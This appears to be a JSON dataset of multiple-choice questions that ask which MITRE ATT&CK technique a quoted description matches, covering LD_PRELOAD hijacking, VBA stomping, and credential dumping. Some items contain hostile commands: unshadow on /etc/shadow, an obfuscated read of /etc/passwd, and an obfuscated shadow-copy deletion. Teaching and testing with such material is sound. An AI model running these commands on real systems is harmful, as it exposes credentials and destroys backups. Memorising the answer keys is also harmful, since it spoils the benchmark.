      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python\u2019s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file. Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.  \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.",
      "options": "A. Hijack Execution Flow: Dynamic Linker Hijacking, B. Phishing, C. Boot or Logon Autostart Execution: Winlogon Helper DLL, D. Boot or Logon Initialization Scripts",
      "choice": "A. Hijack Execution Flow: Dynamic Linker Hijacking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero\u2019s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.\n\nOptions:\nA. Web Service, B. Hide Artifacts: VBA Stomping, C. System Network Configuration Discovery, D. Indicator Removal: Clear Persistence",
    "context": "",
    "output": "B. Hide Artifacts: VBA Stomping",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero\u2019s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.",
      "options": "A. Web Service, B. Hide Artifacts: VBA Stomping, C. System Network Configuration Discovery, D. Indicator Removal: Clear Persistence",
      "choice": "B. Hide Artifacts: VBA Stomping",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.\n\nA. Data Encoding: Non-Standard Encoding, B. System Binary Proxy Execution: Mavinject, C. Boot or Logon Autostart Execution: XDG Autostart Entries, D. Scheduled Task/Job\nA:",
    "context": "",
    "output": "D. Scheduled Task/Job",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
      "options": "A. Data Encoding: Non-Standard Encoding, B. System Binary Proxy Execution: Mavinject, C. Boot or Logon Autostart Execution: XDG Autostart Entries, D. Scheduled Task/Job",
      "choice": "D. Scheduled Task/Job",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim\u2019s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.\n\nFor example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional Resource Hijacking without raising suspicion by using up a victim\u2019s entire quota. Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.\n\nAdversaries may also modify settings that affect where cloud resources can be deployed, such as enabling Unused/Unsupported Cloud Regions. In Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources, or engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim\u2019s compute resources without generating logs on the victim tenant.\n\nA. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations, B. System Information Discovery, C. Server Software Component, D. Unsecured Credentials: Container API\nA:",
    "context": "",
    "output": "A. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim\u2019s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.\n\nFor example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional Resource Hijacking without raising suspicion by using up a victim\u2019s entire quota. Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.\n\nAdversaries may also modify settings that affect where cloud resources can be deployed, such as enabling Unused/Unsupported Cloud Regions. In Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources, or engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim\u2019s compute resources without generating logs on the victim tenant.",
      "options": "A. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations, B. System Information Discovery, C. Server Software Component, D. Unsecured Credentials: Container API",
      "choice": "A. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to the technique associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to the technique such as files, directories, user accounts, or other system activity to evade detection.\n\nAdversaries may also attempt to the technique associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.\nA. Exploitation for Defense Evasion, B. Hijack Execution Flow: Path Interception by Search Order Hijacking, C. External Remote Services, D. Hide Artifacts\nAnswer:",
    "context": "",
    "output": "D. Hide Artifacts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to the technique associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to the technique such as files, directories, user accounts, or other system activity to evade detection.\n\nAdversaries may also attempt to the technique associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.",
      "options": "A. Exploitation for Defense Evasion, B. Hijack Execution Flow: Path Interception by Search Order Hijacking, C. External Remote Services, D. Hide Artifacts",
      "choice": "D. Hide Artifacts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.\nA. Abuse Elevation Control Mechanism, B. Scheduled Task/Job: Systemd Timers, C. Compromise Infrastructure: Botnet, D. Domain or Tenant Policy Modification: Trust Modification",
    "context": "",
    "output": "A. Abuse Elevation Control Mechanism",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.",
      "options": "A. Abuse Elevation Control Mechanism, B. Scheduled Task/Job: Systemd Timers, C. Compromise Infrastructure: Botnet, D. Domain or Tenant Policy Modification: Trust Modification",
      "choice": "A. Abuse Elevation Control Mechanism",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.\n\nA. Create Account, B. Power Settings, C. Internal Spearphishing, D. Acquire Infrastructure: Serverless\nA:",
    "context": "",
    "output": "D. Acquire Infrastructure: Serverless",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.",
      "options": "A. Create Account, B. Power Settings, C. Internal Spearphishing, D. Acquire Infrastructure: Serverless",
      "choice": "D. Acquire Infrastructure: Serverless",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. PowerShell cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.\n\nOptions:\nA. Account Discovery: Domain Account, B. Establish Accounts: Social Media Accounts, C. Acquire Infrastructure, D. Active Scanning: Wordlist Scanning",
    "context": "",
    "output": "A. Account Discovery: Domain Account",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. PowerShell cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.",
      "options": "A. Account Discovery: Domain Account, B. Establish Accounts: Social Media Accounts, C. Acquire Infrastructure, D. Active Scanning: Wordlist Scanning",
      "choice": "A. Account Discovery: Domain Account",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>\n\nA. OS Credential Dumping: /etc/passwd and /etc/shadow, B. Boot or Logon Autostart Execution: XDG Autostart Entries, C. Email Collection: Remote Email Collection, D. Multi-Factor Authentication Interception\nA:",
    "context": "",
    "output": "A. OS Credential Dumping: /etc/passwd and /etc/shadow",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>",
      "options": "A. OS Credential Dumping: /etc/passwd and /etc/shadow, B. Boot or Logon Autostart Execution: XDG Autostart Entries, C. Email Collection: Remote Email Collection, D. Multi-Factor Authentication Interception",
      "choice": "A. OS Credential Dumping: /etc/passwd and /etc/shadow",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.\n\nA. Data Manipulation: Transmitted Data Manipulation, B. Service Stop, C. Obtain Capabilities: Exploits, D. Proxy: Internal Proxy\nA:",
    "context": "",
    "output": "D. Proxy: Internal Proxy",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
      "options": "A. Data Manipulation: Transmitted Data Manipulation, B. Service Stop, C. Obtain Capabilities: Exploits, D. Proxy: Internal Proxy",
      "choice": "D. Proxy: Internal Proxy",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.\n\nA. Obfuscated Files or Information: Command Obfuscation, B. Create or Modify System Process, C. Endpoint Denial of Service: Service Exhaustion Flood, D. Compromise Accounts\nAnswer:",
    "context": "",
    "output": "A. Obfuscated Files or Information: Command Obfuscation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.",
      "options": "A. Obfuscated Files or Information: Command Obfuscation, B. Create or Modify System Process, C. Endpoint Denial of Service: Service Exhaustion Flood, D. Compromise Accounts",
      "choice": "A. Obfuscated Files or Information: Command Obfuscation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  }
]